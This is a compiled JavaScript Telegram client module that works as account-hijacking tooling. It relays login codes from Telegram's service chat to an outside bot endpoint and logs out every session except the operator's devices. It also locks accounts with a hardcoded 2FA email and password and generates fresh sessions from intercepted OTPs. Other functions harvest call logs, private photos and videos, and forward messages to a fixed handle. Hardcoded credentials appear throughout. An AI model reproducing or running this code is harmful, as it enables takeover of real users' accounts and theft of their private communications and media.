"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const events_1 = require("telegram/events");
const tl_1 = require("telegram/tl");
const axios_1 = require("axios");
const fs = require("fs");
const uploads_1 = require("telegram/client/uploads");
const utils_1 = require("../../utils");
const Helpers_1 = require("telegram/Helpers");
const Logger_1 = require("telegram/extensions/Logger");
const IMap_1 = require("../../IMap/IMap");
const bigInt = require("big-integer");
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async disconnect() {
        if (this.client) {
            console.log("Destroying Client: ", this.phoneNumber);
            await this.client.destroy();
            this.client._destroyed = true;
            await this.client.disconnect();
            this.client = null;
        }
        this.session.delete();
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        const me = await this.client.getMe();
        return me;
    }
    async errorHandler(error) {
        (0, utils_1.parseError)(error);
        if (error.message && error.message == 'TIMEOUT') {
        }
        else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
        }
    }
    async createClient(handler = true, handlerFn) {
        this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(Logger_1.LogLevel.ERROR);
        this.client._errorHandler = this.errorHandler;
        await this.client.connect();
        const me = await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler");
            if (handlerFn) {
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
            }
            else {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
            }
        }
        return this.client;
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }
    async getLastMsgs(limit) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }
    async getSelfMSgsInfo() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const self = await this.client.getMe();
        const selfChatId = self.id;
        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
            else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++;
                    }
                    else {
                        otherPhotoCount++;
                    }
                }
                else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++;
                    }
                    else {
                        otherVideoCount++;
                    }
                }
            }
        }
        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount });
    }
    async channelInfo(sendIds = false) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 1500 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        const canSendFalseChats = [];
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    }
                    else {
                        canSendFalseCount++;
                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                    }
                }
                catch (error) {
                    (0, utils_1.parseError)(error);
                }
            }
        }
        ;
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : [],
            canSendFalseChats
        };
    }
    async leaveChannels(chats) {
        console.log("Leaving Channels: initaied!!");
        console.log("ChatsLength: ", chats);
        for (let id of chats) {
            try {
                const joinResult = await this.client.invoke(new tl_1.Api.channels.LeaveChannel({
                    channel: id
                }));
                console.log("Left channel :", id);
                await (0, Helpers_1.sleep)(30000);
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                console.log("Failed to leave channel :", errorDetails.message);
            }
        }
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        return await this.client?.invoke(new tl_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
                auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            }
            else {
                this.client?.invoke(new tl_1.Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id);
            const sizes = message.photo?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id);
            const sizes = message.document?.thumbs || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new tl_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new tl_1.Api.messages.Search({
            peer: new tl_1.Api.InputPeerEmpty(),
            q: '',
            filter: new tl_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: bigInt(0),
        }));
        return result;
    }
    async getCallLog() {
        const result = await this.client.invoke(new tl_1.Api.messages.Search({
            peer: new tl_1.Api.InputPeerEmpty(),
            q: '',
            filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: bigInt(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof tl_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = await this.client.getEntity(chatId);
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0;
                const msgs = await this.client.getMessages(chatId, { limit: 600 });
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!(0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
                            photo++;
                        }
                        else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++;
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...details,
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                });
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });
        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000));
                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(event.message.text)}`);
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new tl_1.Api.account.UpdateProfile(data));
            console.log("Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new tl_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        console.log("Failed to download the photo.");
                    }
                }
                else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                console.log("No profile photos found.");
            }
        }
        catch (err) {
            console.error("Error:", err);
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore') && !auth.deviceModel.includes("Windows")
                && !auth.appName.toLowerCase().includes("hanslnz")) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }
    async getContacts() {
        const exportedContacts = await this.client.invoke(new tl_1.Api.contacts.GetContacts({
            hash: bigInt(0)
        }));
        return exportedContacts;
    }
    async deleteChat(chatId) {
        try {
            await this.client.invoke(new tl_1.Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: false,
            }));
            console.log(`Dialog with ID ${chatId} has been deleted.`);
        }
        catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }
    async blockUser(chatId) {
        try {
            await this.client?.invoke(new tl_1.Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            console.error('Failed to block user:', error);
        }
    }
    downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    async getMediaMetadata(chatId = 'me', offset = undefined, limit = 100) {
        try {
            const query = { limit: parseInt(limit.toString()) };
            if (offset)
                query['offsetId'] = parseInt(offset.toString());
            const messages = await this.client.getMessages(chatId, query);
            const mediaMessages = messages.filter(message => {
                return (message.media && message.media.className !== "MessageMediaWebPage");
            });
            console.log("Total:", messages.total, "fetched: ", messages.length, "ChatId: ", chatId, "Media :", mediaMessages.length);
            if (!messages.length) {
                console.log("No more media messages found. Reached the end of the chat.");
                return { data: [], endOfMessages: true };
            }
            const data = [];
            for (const message of mediaMessages) {
                console.log(message.media.className, message.document?.mimeType);
                let thumbBuffer = null;
                try {
                    if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
                        const sizes = message.photo?.sizes || [1];
                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                        console.log("messageId image:", message.id);
                        data.push({
                            messageId: message.id,
                            mediaType: 'photo',
                            thumb: thumbBuffer?.toString('base64') || null,
                        });
                    }
                    else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                        const sizes = message.document?.thumbs || [1];
                        console.log("messageId video:", message.id);
                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                        data.push({
                            messageId: message.id,
                            mediaType: 'video',
                            thumb: thumbBuffer?.toString('base64') || null,
                        });
                    }
                }
                catch (downloadError) {
                    if (downloadError.message === 'Download timeout') {
                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);
                    }
                    else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {
                        console.warn('File reference expired for message. Skipping this media.');
                    }
                    else {
                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);
                    }
                    data.push({
                        messageId: message.id,
                        mediaType: 'photo',
                        thumb: null,
                    });
                    continue;
                }
            }
            if (!data.length) {
                data.push({
                    messageId: messages[messages.length - 1].id,
                    mediaType: 'photo',
                    thumb: null,
                });
            }
            console.log("Returning ", data.length);
            return { data, endOfMessages: false };
        }
        catch (error) {
            console.error('Error in getMediaMetadata:', error);
            if (error.message.includes('FLOOD_WAIT')) {
                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\d+)/)[1], 10);
                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);
                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                return this.getMediaMetadata(chatId, offset, limit);
            }
            throw new Error('Error fetching media metadata');
        }
    }
    async downloadMediaFile(messageId, chatId = 'me', res) {
        try {
            const messages = await this.client.getMessages(chatId, { ids: [messageId] });
            const message = messages[0];
            if (message && !(message.media instanceof tl_1.Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || message.photo;
                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };
                if (media instanceof tl_1.Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new tl_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                }
                else if (media instanceof tl_1.Api.MessageMediaDocument) {
                    contentType = media.mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new tl_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                }
                else {
                    return res.status(415).send('Unsupported media type');
                }
                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                const chunkSize = 512 * 1024;
                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: bigInt[0],
                    limit: 5 * 1024 * 1024,
                    requestSize: chunkSize,
                })) {
                    res.write(chunk);
                }
                res.end();
            }
            else {
                res.status(404).send('Media not found');
            }
        }
        catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }
    async forwardMessage(chatId, messageId) {
        try {
            await this.client.forwardMessages("@fuckyoubabie", { fromPeer: chatId, messages: messageId });
        }
        catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            }
            catch (error) {
                console.log(error);
            }
        }
        else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(new tl_1.Api.account.CheckUsername({ username }));
                    console.log(result, " - ", username);
                    if (result) {
                        const res = await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        username = baseUsername + increment;
                        increment++;
                        await (0, Helpers_1.sleep)(2000);
                    }
                }
                catch (error) {
                    console.log(error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                    await (0, Helpers_1.sleep)(2000);
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async getFileUrl(url, filename) {
        const response = await axios_1.default.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        return filePath;
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            console.log("file uploaded");
            await this.client.invoke(new tl_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new tl_1.Api.account.GetPassword());
        return passwordInfo.hasPassword;
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");
                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            }
                                            else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        }
                                        catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', (0, utils_1.parseError)(e));
                                return Promise.resolve("error");
                            }
                        });
                        return twoFaDetails;
                    }
                    else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            }
            catch (e) {
                console.error("Unable to connect to mail server:", (0, utils_1.parseError)(e));
            }
        }
        else {
            console.log("Password already exists");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.log(`Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new tl_1.Api.photos.DeletePhotos({
                    id: result.photos
                }));
            }
            console.log("Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
    async createNewSession() {
        const me = await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err) => { throw err; },
        });
        const session = newClient.session.save();
        await newClient.disconnect();
        await newClient.destroy();
        console.log("New Session: ", session);
        return session;
    }
    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i);
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code);
                    return code;
                }
                else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            catch (err) {
                await (0, Helpers_1.sleep)(2000);
                console.log(err);
            }
        }
    }
}
exports.default = TelegramManager;
//# sourceMappingURL=TelegramManager.js.map